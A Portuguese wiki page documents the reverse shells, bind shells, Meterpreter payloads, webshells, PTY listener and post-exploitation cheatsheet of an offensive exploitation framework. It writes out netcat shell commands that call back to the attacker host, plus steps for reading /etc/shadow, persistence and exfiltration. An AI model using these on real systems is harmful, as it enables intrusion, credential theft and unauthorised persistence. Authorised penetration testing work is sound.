# Shell Stager e Pos-Exploracao

**Idioma:** Portugues (pt-BR) | **English (en-US):** [../en-US/13-shell-stager.md](../en-US/13-shell-stager.md)

---

## Visao geral

O EmbedXPL-Forge inclui um framework de **Shell Stager** integrado aos modulos de exploit armados. Fornece:

- 26 tipos de shell (reverso, bind, Meterpreter, webshells)
- Listener PTY nativo (modo raw, redimensionamento SIGWINCH, upgrade automatico de PTY)
- Geracao de arquivo RC para Meterpreter
- `ShellStagingMixin` para qualquer classe de exploit
- `force_exploit` (pular check) e `ask_on_fail` (perguntar ao usuario em caso de falha)
- Cheatsheet GTFOBins de pos-exploracao automatico apos fechar o shell

---

## Opcoes do Shell Stager

Todos os modulos de exploit armados que incluem o `ShellStagingMixin` expoe estas opcoes:

| Opcao | Tipo | Padrao | Descricao |
|-------|------|--------|-----------|
| `lhost` | `OptString` | `""` | IP do atacante para shells reversos / handler Meterpreter |
| `lport` | `OptPort` | `4444` | Porta TCP do listener |
| `shell_type` | `OptString` | `auto` | Tipo de shell (veja lista completa abaixo) |
| `force_exploit` | `OptBool` | `false` | Pula `check()` e vai direto ao exploit |
| `ask_on_fail` | `OptBool` | `true` | Pergunta ao usuario se `check()` retornar False |
| `pty_upgrade` | `OptBool` | `true` | Envia `python3 pty.spawn()` automaticamente ao conectar |
| `listener_timeout` | `OptPort` | `60` | Segundos para aguardar conexao do shell reverso |

---

## Tipos de shell suportados

### Shells reversos Linux / Unix

| `shell_type` | Descricao |
|---|---|
| `auto` | Tenta bash > python > nc_mkfifo > perl |
| `bash` | Redirecionamento TCP bash |
| `bash_udp` | Redirecionamento UDP bash |
| `nc` | Netcat com `-e` |
| `nc_mkfifo` | Netcat com mkfifo (sem `-e`) |
| `ncat` | Ncat com `-e` |
| `socat` | PTY completo via socat |
| `python` | Socket Python 3 |
| `python2` | Socket Python 2 |
| `perl` | Socket Perl |
| `ruby` | TCPSocket Ruby |
| `php` | fsockopen PHP |
| `awk` | inet AWK |
| `java` | Runtime.exec Java |

### Shells Windows

| `shell_type` | Descricao |
|---|---|
| `powershell` | Shell reverso TCP PowerShell (interativo completo) |
| `powershell_b64` | PowerShell codificado em Base64 |
| `cmd_nc` | `cmd.exe /c nc.exe LHOST LPORT -e cmd.exe` |

### Bind shells

| `shell_type` | Descricao |
|---|---|
| `nc_bind` | `nc -lvp LPORT -e /bin/sh` |
| `python_bind` | Bind shell Python 3 |

### Meterpreter (MSF)

| `shell_type` | Payload MSF |
|---|---|
| `meterpreter_linux` | `linux/x86/meterpreter/reverse_tcp` |
| `meterpreter_linux_x64` | `linux/x64/meterpreter/reverse_tcp` |
| `meterpreter_windows` | `windows/meterpreter/reverse_tcp` |
| `meterpreter_windows_x64` | `windows/x64/meterpreter/reverse_tcp` |
| `meterpreter_php` | `php/meterpreter/reverse_tcp` |
| `meterpreter_python` | `python/meterpreter/reverse_tcp` |

Para tipos Meterpreter, o modulo imprime o comando `msfvenom` + configuracao do handler + grava o arquivo RC em `.tmp/msf_handler_<porta>.rc`.

### Webshells (conteudo para upload)

| `shell_type` | Linguagem | Acesso |
|---|---|---|
| `php_webshell` | PHP | `?cmd=whoami` |
| `aspx_webshell` | ASP.NET | `?cmd=whoami` |
| `jsp_webshell` | Java JSP | `?cmd=whoami` |

---

## Listener PTY nativo

Quando `lhost` esta definido e um tipo de shell reverso e selecionado:

1. Vincula `0.0.0.0:LPORT`
2. Aguarda a conexao reversa
3. Coloca o terminal local em **modo raw** (`tty.setraw`)
4. Usa `select()` para multiplexacao bidirecional de I/O
5. Trata `SIGWINCH` (redimensionamento do terminal) -- envia `stty rows N cols M` ao shell remoto
6. Envia `python3 pty.spawn('/bin/bash')` apos conexao (se `pty_upgrade=true`)
7. Suporta **`Ctrl+]`** (ASCII 29) para desconectar sem matar a sessao
8. Restaura o terminal ao sair via `termios.tcsetattr`

```text
[shell] Ouvindo em 0.0.0.0:4444 (timeout 60s) -- modo PTY
[shell] Shell conectado de 192.168.1.100:52341
[shell] Shell PTY ativo. Ctrl+] para desconectar.

$ id
uid=0(root) gid=0(root)
```

---

## `force_exploit` e `ask_on_fail`

```text
exf (globalprotect_auth_bypass_cve_2026_0257) > set force_exploit true
[+] force_exploit => true
exf (globalprotect_auth_bypass_cve_2026_0257) > run
[!] force_exploit=true -- pulando check, prosseguindo diretamente
```

```text
# Padrao: ask_on_fail=true
exf (globalprotect_auth_bypass_cve_2026_0257) > check
[-] resultado de check(): NAO VULNERAVEL (corrigido ou inalcancavel)
[?] Prosseguir com tentativa de exploit mesmo assim? [y/N] y
[!] Usuario escolheu prosseguir apesar da falha no check
```

---

## Cheatsheet GTFOBins pos-exploracao

Apos cada sessao de shell encerrar, o EmbedXPL-Forge imprime automaticamente um cheatsheet focado em **Linux embarcado / IoT**:

| Categoria | Exemplos |
|-----------|---------|
| Descoberta | `find / -perm -4000`, `sudo -l`, `getcap -r /`, crontabs, `ps aux` |
| Credenciais | `/etc/shadow`, NVRAM, `uci show` (OpenWrt), cameras `/mnt/mtd/Config/Account1` |
| Escalada de privilegios | `python3 os.execl`, `busybox sh`, `awk sudo`, SUID `find`, escape vi |
| Persistencia | cron, injecao de chave SSH, bash SUID, init.d |
| Exfiltracao | `curl`, `nc`, `base64 | nc` |
| Escape de shell restrito | rbash via `env`, `python3`, `vi` |

**Referencia GTFOBins:** [https://gtfobins.github.io](https://gtfobins.github.io)


[Hub da wiki](../README.md)
